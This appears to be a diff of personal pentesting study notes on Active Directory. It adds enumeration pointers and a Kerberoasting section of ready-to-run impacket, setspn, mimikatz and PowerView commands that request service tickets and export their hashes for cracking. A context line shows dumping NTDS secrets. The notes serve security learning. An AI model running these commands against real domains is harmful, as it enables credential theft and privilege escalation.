@@ -56,6 +56,10 @@ Kerberos is a protocol used to provide secure authentication over non-secure net
 When a user logs in, their password is hashed and sent to Kerberos server along with the timestamp for verification. Upon successful login, the server generates a **ticket-granting ticket (TGT)** 🎫.
 
 When the user wants to access a network resource, such as a shared folder or a database, the computer requests a ticket from the Key Distribution Center (KDC) using the TGT. If the request is accepted, the KDC will give them a **Ticket Granting Service (TGS)** 🎟️ that they can use solely for the requested service.
+
+```ps
+PS> klist # list current tickets available
+```
 </div></div>
 
 <hr class="sep-both">
@@ -63,6 +67,28 @@ When the user wants to access a network resource, such as a shared folder or a d
 ## Active Directory Pentester Notes ☠️
 
 <div class="row row-cols-lg-2"><div>
+
+#### Active Directory Enumeration
+
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+To find hosts, refer to [Passive Internal Network Discovery](/cybersecurity/red-team/s1.investigation/techniques/passive_network_discovery.md).
+
+To find usernames/hashes/hosts, refer to [LLMNR/NBT-NS Poisoning](/cybersecurity/red-team/s2.discovery/techniques/network/poisoning.md).
+
+To find usernames+hashes, refer to [Find Internal User Accounts](/cybersecurity/red-team/s2.discovery/techniques/internal/find_usernames.md).
+
+To find the password policy, refer to [Password Policy](/cybersecurity/red-team/s2.discovery/techniques/passwords/policy.md).
+
+On a Windows host inside an AD network, refer to [identification](/cybersecurity/red-team/s4.privesc/windows/utils/id.md) to find usernames the "normal" way.
+
+To find passwords, refer to [Password spraying](/cybersecurity/red-team/s2.discovery/techniques/passwords/spraying.md).
+
+You can use [BloodHound](/cybersecurity/red-team/tools/utilities/windows/bloodhound.md) to collect and analyze information to find attack vectors and attack paths.
+
+📚 We often find the Domain Controller IP and use it as the target of every other request, such as SMB requests, etc.
+
+<br>
 
 #### Dump Secrets From Active Directory database
 
@@ -95,25 +121,37 @@ PS> Get-ADDBAccount -All -DatabasePath .\ntds.dit -BootKey $key
 You can use [NtdsAudit](https://github.com/dionach/NtdsAudit) <small>(0.4k ⭐)</small> on Windows or [DPAT](https://github.com/clr2of8/DPAT) <small>(0.9k ⭐, 2022 🪦)</small> Python Script for statistics.
 </div><div>
 
-#### Active Directory Enumeration
+#### Kerberoasting — Privilege Escalation
 
 [![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
 
-To find hosts, refer to [Passive Internal Network Discovery](/cybersecurity/red-team/s1.investigation/techniques/passive_network_discovery.md).
+Domain accounts are often used to run services. They may have been given many privileges. Each service instance is associated with a service account using a **Service Principal Names (SPN)**.
 
-To find usernames/hashes/hosts, refer to [LLMNR/NBT-NS Poisoning](/cybersecurity/red-team/s2.discovery/techniques/network/poisoning.md).
+We can request a TGS for the target service, and attempt to crack its hash. RC4 hashes are easy to crack while AES hashes are harder.
 
-To find usernames+hashes, refer to [Find Internal User Accounts](/cybersecurity/red-team/s2.discovery/techniques/internal/find_usernames.md).
+It's common to use [mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) or [PowerView](/cybersecurity/red-team/tools/utilities/windows/powersploit.md) to fetch TGS tickets.
 
-To find the password policy, refer to [Password Policy](/cybersecurity/red-team/s2.discovery/techniques/passwords/policy.md).
+```shell!
+$ impacket-GetUserSPNs -dc-ip IP domain/user:password # list all
+$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request # get TGS for all
+$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request-user cn -outputfile cn_tgs # get TGS for 'cn'
+```
+```shell!
+PS> setspn.exe -Q */* # list all (ignore computer accounts)
+PS> setspn.exe -T domain -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } # get TGS for all
+```
 
-On a Windows host inside an AD network, refer to [identification](/cybersecurity/red-team/s4.privesc/windows/utils/id.md) to find usernames the "normal" way.
+```shell!
+mimikatz> kerberos::ask /target:cn # request TGS for cn
+mimikatz> base64 /out:true
+mimikatz> kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
+```
 
-To find passwords, refer to [Password spraying](/cybersecurity/red-team/s2.discovery/techniques/passwords/spraying.md).
-
-You can use [BloodHound](/cybersecurity/red-team/tools/utilities/windows/bloodhound.md) to collect and analyze information to find attack vectors and attack paths.
-
-📚 We often find the Domain Controller IP and use it as the target of every other request, such as SMB requests, etc.
+```shell!
+PS> Import-Module .\PowerView.ps1
+PS> Get-DomainUser * -spn | select samaccountname
+PS> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\xxx.csv -NoTypeInformation
+```
 </div></div>
 
 <hr class="sep-both">
